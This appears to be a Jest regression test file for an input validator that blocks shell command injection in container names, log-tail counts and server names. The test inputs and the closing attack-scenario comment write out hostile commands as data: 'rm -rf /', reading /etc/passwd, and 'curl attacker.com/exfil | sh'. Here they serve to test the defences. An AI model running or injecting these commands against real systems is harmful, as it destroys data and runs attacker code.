/**
 * Regression Tests for InputValidator
 *
 * SECURITY: These tests verify that command injection vulnerabilities are blocked
 *
 * To run these tests, install Jest:
 * npm install --save-dev jest @types/jest ts-jest
 *
 * Then add to package.json:
 * "scripts": { "test": "jest" }
 */

import { InputValidator } from '@/lib/input-validator';

describe('InputValidator - Security Regression Tests', () => {
  describe('validateContainerName', () => {
    describe('VALID inputs (should accept)', () => {
      it('accepts standard container names', () => {
        expect(InputValidator.validateContainerName('nginx-1').valid).toBe(true);
        expect(InputValidator.validateContainerName('ketchup-app').valid).toBe(true);
        expect(InputValidator.validateContainerName('ketchup-app-1').valid).toBe(true);
        expect(InputValidator.validateContainerName('ketchup-app-2').valid).toBe(true);
      });

      it('accepts names with underscores', () => {
        expect(InputValidator.validateContainerName('app_v2').valid).toBe(true);
        expect(InputValidator.validateContainerName('ketchup_metadata_updater').valid).toBe(true);
      });

      it('accepts names with periods', () => {
        expect(InputValidator.validateContainerName('app.v2.3').valid).toBe(true);
        expect(InputValidator.validateContainerName('service.prod').valid).toBe(true);
      });

      it('accepts names with mixed valid characters', () => {
        expect(InputValidator.validateContainerName('app-v2_3.prod').valid).toBe(true);
        expect(InputValidator.validateContainerName('my-app-1.2.3_beta').valid).toBe(true);
      });

      it('accepts names starting with numbers', () => {
        expect(InputValidator.validateContainerName('1app').valid).toBe(true);
        expect(InputValidator.validateContainerName('2nginx').valid).toBe(true);
      });
    });

    describe('CRITICAL: Command Injection Attacks (must reject)', () => {
      it('rejects semicolon command chaining', () => {
        const result = InputValidator.validateContainerName('app; rm -rf /');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Invalid container name format');
      });

      it('rejects backtick command substitution', () => {
        const result = InputValidator.validateContainerName('app`whoami`');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Invalid container name format');
      });

      it('rejects dollar sign command substitution', () => {
        const result = InputValidator.validateContainerName('app$(cat /etc/passwd)');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Invalid container name format');
      });

      it('rejects pipe command chaining', () => {
        const result = InputValidator.validateContainerName('app | cat');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Invalid container name format');
      });

      it('rejects ampersand background execution', () => {
        const result = InputValidator.validateContainerName('app & curl attacker.com');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('Invalid container name format');
      });

      it('rejects redirection operators', () => {
        expect(InputValidator.validateContainerName('app > /tmp/pwned').valid).toBe(false);
        expect(InputValidator.validateContainerName('app < /etc/passwd').valid).toBe(false);
        expect(InputValidator.validateContainerName('app >> /tmp/log').valid).toBe(false);
      });

      it('rejects quotes for string escaping', () => {
        expect(InputValidator.validateContainerName('app"test"').valid).toBe(false);
        expect(InputValidator.validateContainerName("app'test'").valid).toBe(false);
      });

      it('rejects parentheses for subshells', () => {
        expect(InputValidator.validateContainerName('app(whoami)').valid).toBe(false);
      });

      it('rejects braces for expansion', () => {
        expect(InputValidator.validateContainerName('app{1,2,3}').valid).toBe(false);
        expect(InputValidator.validateContainerName('app[1-3]').valid).toBe(false);
      });

      it('rejects backslash escaping', () => {
        expect(InputValidator.validateContainerName('app\\ntest').valid).toBe(false);
      });

      it('rejects exclamation for history expansion', () => {
        expect(InputValidator.validateContainerName('app!test').valid).toBe(false);
      });
    });

    describe('Edge cases', () => {
      it('rejects empty string', () => {
        const result = InputValidator.validateContainerName('');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('required');
      });

      it('rejects null/undefined', () => {
        const result = InputValidator.validateContainerName(null as any);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('required');
      });

      it('rejects names starting with special characters', () => {
        expect(InputValidator.validateContainerName('-app').valid).toBe(false);
        expect(InputValidator.validateContainerName('_app').valid).toBe(false);
        expect(InputValidator.validateContainerName('.app').valid).toBe(false);
      });

      it('rejects names longer than 255 characters', () => {
        const longName = 'a'.repeat(256);
        const result = InputValidator.validateContainerName(longName);
        expect(result.valid).toBe(false);
        expect(result.error).toContain('too long');
      });

      it('rejects newlines and null bytes', () => {
        expect(InputValidator.validateContainerName('app\ntest').valid).toBe(false);
        expect(InputValidator.validateContainerName('app\rtest').valid).toBe(false);
        expect(InputValidator.validateContainerName('app\0test').valid).toBe(false);
      });
    });
  });

  describe('validateTailParameter', () => {
    describe('VALID inputs (should accept)', () => {
      it('accepts valid positive integers', () => {
        const result1 = InputValidator.validateTailParameter('1');
        expect(result1.valid).toBe(true);
        expect(result1.value).toBe(1);

        const result100 = InputValidator.validateTailParameter('100');
        expect(result100.valid).toBe(true);
        expect(result100.value).toBe(100);

        const result1000 = InputValidator.validateTailParameter('1000');
        expect(result1000.valid).toBe(true);
        expect(result1000.value).toBe(1000);

        const result10000 = InputValidator.validateTailParameter('10000');
        expect(result10000.valid).toBe(true);
        expect(result10000.value).toBe(10000);
      });

      it('returns default value for empty input', () => {
        const result = InputValidator.validateTailParameter('');
        expect(result.valid).toBe(true);
        expect(result.value).toBe(1000);
      });
    });

    describe('CRITICAL: Command Injection Attacks (must reject)', () => {
      it('rejects semicolon command chaining', () => {
        const result = InputValidator.validateTailParameter('1000; rm -rf /');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('positive integer');
      });

      it('rejects command substitution with backticks', () => {
        const result = InputValidator.validateTailParameter('1000`whoami`');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('positive integer');
      });

      it('rejects command substitution with $()', () => {
        const result = InputValidator.validateTailParameter('1000$(whoami)');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('positive integer');
      });

      it('rejects pipe operators', () => {
        const result = InputValidator.validateTailParameter('1000 | curl attacker.com');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('positive integer');
      });

      it('rejects ampersand operators', () => {
        const result = InputValidator.validateTailParameter('1000 & curl attacker.com');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('positive integer');
      });

      it('rejects any non-numeric characters', () => {
        expect(InputValidator.validateTailParameter('1000a').valid).toBe(false);
        expect(InputValidator.validateTailParameter('a1000').valid).toBe(false);
        expect(InputValidator.validateTailParameter('10.00').valid).toBe(false);
        expect(InputValidator.validateTailParameter('10-00').valid).toBe(false);
      });
    });

    describe('Range validation', () => {
      it('rejects zero', () => {
        const result = InputValidator.validateTailParameter('0');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('at least 1');
      });

      it('rejects negative numbers', () => {
        const result = InputValidator.validateTailParameter('-1');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('positive integer');
      });

      it('rejects values over 10000', () => {
        const result = InputValidator.validateTailParameter('10001');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('cannot exceed 10000');
      });

      it('rejects very large numbers (DoS protection)', () => {
        const result = InputValidator.validateTailParameter('999999999');
        expect(result.valid).toBe(false);
        expect(result.error).toContain('cannot exceed 10000');
      });
    });
  });

  describe('validateServerName', () => {
    it('accepts whitelisted servers', () => {
      expect(InputValidator.validateServerName('prod1').valid).toBe(true);
      expect(InputValidator.validateServerName('prod2').valid).toBe(true);
    });

    it('rejects non-whitelisted servers', () => {
      expect(InputValidator.validateServerName('prod3').valid).toBe(false);
      expect(InputValidator.validateServerName('dev').valid).toBe(false);
      expect(InputValidator.validateServerName('staging').valid).toBe(false);
      expect(InputValidator.validateServerName('localhost').valid).toBe(false);
    });

    it('rejects injection attempts', () => {
      expect(InputValidator.validateServerName('prod1; rm -rf /').valid).toBe(false);
      expect(InputValidator.validateServerName('prod1$(whoami)').valid).toBe(false);
    });

    it('rejects empty/null values', () => {
      expect(InputValidator.validateServerName('').valid).toBe(false);
      expect(InputValidator.validateServerName(null as any).valid).toBe(false);
    });
  });

  describe('sanitizeForShell (backup defense)', () => {
    it('removes dangerous characters', () => {
      expect(InputValidator.sanitizeForShell('app; rm -rf /')).toBe('apprm-rf');
      expect(InputValidator.sanitizeForShell('app$(whoami)')).toBe('appwhoami');
      expect(InputValidator.sanitizeForShell('app|cat')).toBe('appcat');
    });

    it('preserves safe characters', () => {
      expect(InputValidator.sanitizeForShell('app-v2_3.prod')).toBe('app-v2_3.prod');
      expect(InputValidator.sanitizeForShell('nginx-1')).toBe('nginx-1');
    });
  });
});

/**
 * ATTACK SCENARIOS BLOCKED BY THESE VALIDATIONS
 *
 * 1. CRITICAL-1: Container Parameter Command Injection
 *    Before: container = "nginx-1; rm -rf /"
 *    Result: docker logs -f --tail 1000 nginx-1; rm -rf /
 *    After: ❌ Rejected - semicolon not allowed
 *
 * 2. CRITICAL-2: Tail Parameter Command Injection
 *    Before: tail = "1000; curl attacker.com/exfil | sh"
 *    Result: docker logs -f --tail 1000; curl attacker.com/exfil | sh nginx-1
 *    After: ❌ Rejected - non-numeric characters not allowed
 *
 * 3. Command Substitution
 *    Before: container = "app`whoami`" or "app$(cat /etc/passwd)"
 *    After: ❌ Rejected - backticks and $() not allowed
 *
 * 4. Pipe Injection
 *    Before: container = "app | cat /etc/passwd"
 *    After: ❌ Rejected - pipe character not allowed
 *
 * 5. Resource Exhaustion
 *    Before: tail = "999999999"
 *    After: ❌ Rejected - max value is 10000
 */
